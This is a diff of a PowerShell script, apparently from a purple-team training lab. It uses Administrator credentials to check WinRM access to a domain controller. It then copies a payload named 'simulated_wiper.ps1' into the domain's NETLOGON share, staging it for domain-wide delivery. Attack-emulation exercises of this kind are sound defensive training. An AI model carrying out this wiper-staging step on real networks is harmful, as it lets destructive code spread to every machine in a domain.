@@ -1,22 +1,20 @@
 [CmdletBinding()]
 param(
     [Parameter(Mandatory)]
-    [string]$DomainControllerEvidencePath
-    [Parameter(Mandatory)]
-    [string]$OutputDirectory
+    [string]$DomainControllerEvidencePath,
+    #[Parameter(Mandatory)]
+    [string]$OutputDirectory = $DomainControllerEvidencePath
 )
 
+<#$DomainControllerEvidencePath = (Get-ChildItem -Path $DomainControllerEvidencePath -Directory | Sort-Object CreationTime -Descending | 
+Select-Object -First 1).FullName#>
+$DomainControllerEvidencePath = Join-Path -Path $DomainControllerEvidencePath -ChildPath "05_domain-controller.json"
 $ErrorActionPreference = 'Stop'
 
-if (-not (Test-Path -LiteralPath $DomainControllerEvidencePath -PathType Leaf)) {
-    throw "Target directory does not exist: $DomainControllerEvidencePath"
-}
-if(!((Get-Item $DomainControllerEvidencePath).Extension -eq ".json")) {
-    throw "Error: " + $DomainControllerEvidencePath + " is not a json file!"
-}
 
-$data = Get-Content -Path $DomainControllerEvidencePath -Raw | ConvertFrom-Json
-$ServerFqdn = $data.dc_name
+$ServerFqdn = (
+    Get-Content $DomainControllerEvidencePath -Raw | ConvertFrom-Json
+).dc_name
 
 
 $credential = Get-Credential -UserName 'PURPLELAB\Administrator' `
@@ -42,7 +40,22 @@ $accessProof = Invoke-Command `
         }
     }
 
-$accessProof | ConvertTo-Json |
-    Set-Content -Path (Join-Path $OutputDirectory 'dc-access-proof.json') -Encoding UTF8
+$result = [ordered]@{
+    target_fqdn    = $ServerFqdn
+    winrm_reachable = $true
+    remote_access  = $accessProof
+}
 
-Enter-PSSession -ComputerName $ServerFqdn -Credential ($credential)
+$proofPath = Join-Path $OutputDirectory 'dc-access-proof.json'
+$result | ConvertTo-Json -Depth 4 |
+    Set-Content -LiteralPath $proofPath -Encoding utf8
+
+Write-Host "DC access test passed: $proofPath"
+
+#Copy-Item -Path "C:\CyberRangers\payload\simulated_wiper.ps1" -Destination "\\purplelab.local\NETLOGON" -FromSession (New-PSSession -ComputerName $ServerFqdn -Credential ($Credential))
+#Enter-PSSession -ComputerName $ServerFqdn -Credential ($credential)
+$Session = New-PSSession -ComputerName $ServerFqdn -Credential ($credential)
+
+Copy-Item -Path "C:\CyberRangers\payload\simulated_wiper.ps1" -Destination "\\purplelab.local\NETLOGON" -FromSession $Session
+
+Remove-PSSession $Session
